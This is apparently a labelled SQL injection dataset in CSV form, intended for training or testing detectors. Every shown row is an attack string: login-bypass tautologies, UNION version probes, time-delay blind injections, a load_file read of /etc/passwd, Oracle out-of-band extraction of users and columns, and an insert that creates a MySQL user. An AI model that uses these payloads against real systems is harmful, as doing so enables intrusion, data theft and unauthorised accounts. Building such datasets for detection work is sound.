payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 %!<1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %!<<NUM> or <NUM> = <NUM> -- <NUM>
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,sqli_dataset.csv,,True,declare @q nvarchar ( 200 ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),declare @q nvarchar ( <NUM> ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q )
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or $+<<NUM> union select <NUM>,@@VERSION -- <NUM>"
or 'unusual'   =   'unusual',1,sqli_dataset.csv,,False,or 'unusual' = 'unusual',or <STR> = <STR>
 or 1 in   (  select @@version  )  --,1,sqli_dataset.csv,,False,or 1 in ( select @@version ) --,or <NUM> in ( select @@version ) --
truncate,1,sqli_dataset.csv,,False,truncate,truncate
 or 3  =  3 --,1,sqli_dataset.csv,,False, or 3 = 3 --, or <NUM> = <NUM> --
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> ||<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>"
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@$$ union select <NUM>,version ( ) -- <NUM>"
"admin""  )   or   (  ""1""  =  ""1",1,sqli_dataset.csv,,False,"admin"" ) or ( ""1"" = ""1",<TABLE><STR><NUM><STR><NUM>
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""@ union select <STR>,version ( ) -- <NUM>"
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,sqli_dataset.csv,,False,"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #","<NUM> ) or benchmark ( <NUM>,MD5 ( <NUM> ) ) #"
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select .1_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select .1_,version ( ) -- <NUM>"
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,sqli_dataset.csv,,False,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,AND <NUM> = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND <STR> = 'i
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 %$ 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %$ <NUM> or <NUM> = <NUM> -- <NUM>
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 %!<@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %!<@ or <NUM> = <NUM> -- <NUM>
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,sqli_dataset.csv,,False,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,<NUM>,<NUM> ) <> <NUM> ) waitfor delay <STR> --"
1  )   or sleep  (  __TIME__  )  #,1,sqli_dataset.csv,,False,1 ) or sleep ( __TIME__ ) #,<NUM> ) or sleep ( __TIME__ ) #
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 <1## union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <<NUM>## union select <NUM>,version ( ) -- <NUM>"
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + $+*\ union select null,@@VERSION -- <NUM>"
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1. <@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM>. <@ or <NUM> = <NUM> -- <NUM>
 or true--,1,sqli_dataset.csv,,False,or true--,or true--
; execute immediate 'sel' || 'ect us' || 'er',1,sqli_dataset.csv,,False,; execute immediate 'sel' || 'ect us' || 'er',; execute immediate <STR> || <STR> || <STR>
hi' or 'x'  =  'x';,1,sqli_dataset.csv,,False,hi' or 'x' = 'x';,hi<STR>x<STR>x';
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 <@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> <@ or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
admin' #,1,sqli_dataset.csv,,False,admin' #,<TABLE>' #
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@$_ union select <NUM>,version ( ) -- <NUM>"
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,sqli_dataset.csv,,False,"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;","union select <NUM>,load_file ( <STR> ) ,<NUM>,<NUM>,<NUM>;"
"""  )  ;waitfor delay '0:0:__TIME__'--",1,sqli_dataset.csv,,False,""" ) ;waitfor delay '0:0:__TIME__'--",""" ) ;waitfor delay <STR>--"
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,sqli_dataset.csv,,False,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )","insert into mysql.user ( user, host, <COL> ) values ( <STR>, <STR>, <COL> ( <STR> ) )"
"admin"" or ""1""  =  ""1""/*",1,sqli_dataset.csv,,False,"admin"" or ""1"" = ""1""/*","<TABLE><STR><NUM><STR><NUM>""/*"
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> = <NUM> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \<<NUM> union select <NUM>,@@VERSION -- <NUM>"
like,1,sqli_dataset.csv,,False,like,like
or username like char  (  37  )  ;,1,sqli_dataset.csv,,False,or username like char ( 37 ) ;,or <COL> like char ( <NUM> ) ;
 )    )    or pg_sleep  (  __TIME__  )  --,1,sqli_dataset.csv,,False,) ) or pg_sleep ( __TIME__ ) --,) ) or pg_sleep ( __TIME__ ) --
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 or $+<\ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or $+<\ or <NUM> = <NUM> -- <NUM>
or 3  =  3,1,sqli_dataset.csv,,False,or 3 = 3,or <NUM> = <NUM>
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or ( $+ ) = <NUM> or <NUM> = <NUM> -- <NUM>
exec sp,1,sqli_dataset.csv,,False,exec sp,exec sp
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \+<$ union select <NUM>,@@VERSION -- <NUM>"
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1 or \<$ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \<$ or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1.&&1 union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM>.&&<NUM> union select <NUM>,version ( ) -- <NUM>"
admin' or 1  =  1/*,1,sqli_dataset.csv,,False,admin' or 1 = 1/*,<TABLE>' or <NUM> = <NUM>/*
a' waitfor delay '0:0:10'--,1,sqli_dataset.csv,,False,a' waitfor delay '0:0:10'--,a<STR><NUM>:<NUM>:<NUM>'--
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,sqli_dataset.csv,,True,"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + ( \ ) union select null,@@VERSION -- <NUM>"
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select .1$_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select .<NUM>$_,version ( ) -- <NUM>"
and 1 in   (  select var from temp  )  --,1,sqli_dataset.csv,,False,and 1 in ( select var from temp ) --,and <NUM> in ( select var from temp ) --
hi'  )   or   (  'a'  =  'a,1,sqli_dataset.csv,,False,hi' ) or ( 'a' = 'a,hi<STR>a<STR>a
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
"admin"" or 1  =  1",1,sqli_dataset.csv,,False,"admin"" or 1 = 1","<TABLE>"" or <NUM> = <NUM>"
"""  )   or true--",1,sqli_dataset.csv,,False,""" ) or true--",""" ) or true--"
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or $ . = <NUM> union select <NUM>,@@VERSION -- <NUM>'"
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
1  )   or pg_sleep  (  __TIME__  )  --,1,sqli_dataset.csv,,False,1 ) or pg_sleep ( __TIME__ ) --,<NUM> ) or pg_sleep ( __TIME__ ) --
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
"""  )   or sleep  (  __TIME__  )    =  """,1,sqli_dataset.csv,,False,""" ) or sleep ( __TIME__ ) = """,<STR>
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,sqli_dataset.csv,,False,select * from users where id = 1.<@. or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM>.<@. or <NUM> = <NUM> -- <NUM>
"admin""  )   or   (  ""1""  =  ""1""--",1,sqli_dataset.csv,,False,"admin"" ) or ( ""1"" = ""1""--","<TABLE><STR><NUM><STR><NUM>""--"
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1<@.. union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM><@.. union select <NUM>,version ( ) -- <NUM>"
; exec xp_regread,1,sqli_dataset.csv,,False,; exec xp_regread,; exec xp_regread
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,True,"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> + @ <NUM> union select <NUM>,version ( ) -- <NUM>'"
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 + \+%1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> + \+%<NUM> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
1 and 1  =  1,1,sqli_dataset.csv,,False,1 and 1 = 1,<NUM> and <NUM> = <NUM>
or 0  =  0 #,1,sqli_dataset.csv,,False,or 0 = 0 #,or <NUM> = <NUM> #
union select * from users where login   =   char ...,1,sqli_dataset.csv,,False,union select * from users where login = char ...,union select * from <TABLE> where <TABLE> = char ...
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select 1||@,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>||@,version ( ) -- <NUM>"
admin'  )   or '1'  =  '1'--,1,sqli_dataset.csv,,False,admin' ) or '1' = '1'--,<TABLE><STR><NUM><STR><NUM>'--
1;SELECT *,1,sqli_dataset.csv,,False,1;SELECT *,<NUM>;SELECT *
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,sqli_dataset.csv,,False,x' and 1 = ( select count ( * ) from tabname ) ; --,x' and <NUM> = ( select count ( * ) from tabname ) ; --
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or <STR><@ union select <NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'","select * from <TABLE> where <COL> = <STR> ||<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>'"
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,sqli_dataset.csv,,False,"1 or benchmark ( 10000000,MD5 ( 1 ) ) #","<NUM> or benchmark ( <NUM>,MD5 ( <NUM> ) ) #"
procedure,1,sqli_dataset.csv,,False,procedure,procedure
or ''  =  ',1,sqli_dataset.csv,,False,or '' = ',or <STR> = '
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,sqli_dataset.csv,,False,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,AND <NUM> = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND <STR> = 'i
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
\'; desc users; --,1,sqli_dataset.csv,,False,\'; desc users; --,\'; desc <TABLE>; --
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or ( \. ) = <NUM> union select <NUM>,@@VERSION -- <NUM>"
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,sqli_dataset.csv,,False,select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> or $ <NUM> = <NUM> or <NUM> = <NUM> -- <NUM>'
""" or """"^""",1,sqli_dataset.csv,,False,""" or """"^""",<STR><STR>
"""-""",1,sqli_dataset.csv,,False,"""-""",<STR>
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \< = <NUM> union select <NUM>,@@VERSION -- <NUM>"
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 union select 1<@$,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM><@$,version ( ) -- <NUM>"
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 *\ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> *\ union select null,@@VERSION -- <NUM>"
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or !<@ union select <NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>
